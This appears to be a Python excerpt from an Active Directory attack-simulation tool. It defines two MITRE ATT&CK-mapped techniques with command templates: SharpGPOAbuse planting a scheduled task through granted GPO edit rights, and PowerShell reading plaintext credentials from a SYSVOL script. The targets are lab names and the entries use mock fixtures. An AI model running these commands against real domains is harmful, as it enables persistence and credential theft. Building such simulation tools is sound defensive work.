...
TECHNIQUES: dict[str, Technique] = {
    ...
    "gpo_edit_abuse": Technique(
        id="gpo_edit_abuse",
        name="Abuse granted GPO edit rights to plant a malicious scheduled task",
        attack_id="T1484.001",
        attack_url="https://attack.mitre.org/techniques/T1484/001/",
        tool="SharpGPOAbuse",
        target_role="domain_controller",
        kill_chain_phase="persistence",
        command_template=(
            "SharpGPOAbuse.exe", "--AddComputerTask",
            "--TaskName", "UpdateCache",
            "--Author", "EADADL\\helpdesk-jsmith",
            "--Command", "cmd.exe",
            "--Arguments", "/c whoami > C:\\Windows\\Temp\\out.txt",
            "--GPOName", "Lab-Workstation-Baseline",
        ),
        mock_fixture="gpo_edit_abuse.json",
    ),
    "sysvol_credential_read": Technique(
        id="sysvol_credential_read",
        name="Read plaintext credentials planted in a SYSVOL script",
        attack_id="T1552.001",
        attack_url="https://attack.mitre.org/techniques/T1552/001/",
        tool="PowerShell (Get-Content)",
        target_role="domain_controller",
        kill_chain_phase="credential_access",
        command_template=(
            "powershell.exe", "-Command", "Get-Content",
            "\\\\{hostname}\\SYSVOL\\eadadl.lab\\scripts\\map-network-drive.ps1",
        ),
        mock_fixture="sysvol_credential_read.json",
    ),
}
